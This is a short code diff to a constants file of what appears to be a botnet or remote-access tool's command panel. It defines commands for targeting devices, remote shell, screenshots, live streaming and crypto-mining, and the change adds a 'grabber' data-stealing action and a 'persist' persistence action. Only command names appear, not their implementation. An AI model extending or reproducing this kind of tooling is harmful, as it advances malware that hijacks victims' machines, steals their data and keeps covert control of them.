@@ -112,9 +112,9 @@ export const DEV_CMDS = new Set([
   'rm', 'mv', 'cp', 'mkdir',
 ])
 
-export const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', '!untarget', '!history', '!search', '!miner', '!upload', '!stream', '!ai', '!campaign']
+export const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', '!untarget', '!history', '!search', '!miner', '!upload', '!stream', '!ai', '!campaign', '!analyze']
 
 export const VALID_CMDS = new Set([...DEV_CMDS])
 
-export const ALERT_CMD_MAP = { ss: 'screenshot', cmd: 'shell', stream: 'stream', miner: 'miner' }
-export const BTN_ACTIONS = { screenshot: 'screenshot', stream: 'stream start', shell_btn: 'shell' }
+export const ALERT_CMD_MAP = { ss: 'screenshot', cmd: 'shell', stream: 'stream', miner: 'miner', grabber: 'grabber', persist: 'persist' }
+export const BTN_ACTIONS = { screenshot: 'screenshot', stream: 'stream start', shell_btn: 'shell', grabber: 'grabber', dir: 'dir', tree: 'tree', disk: 'disk' }
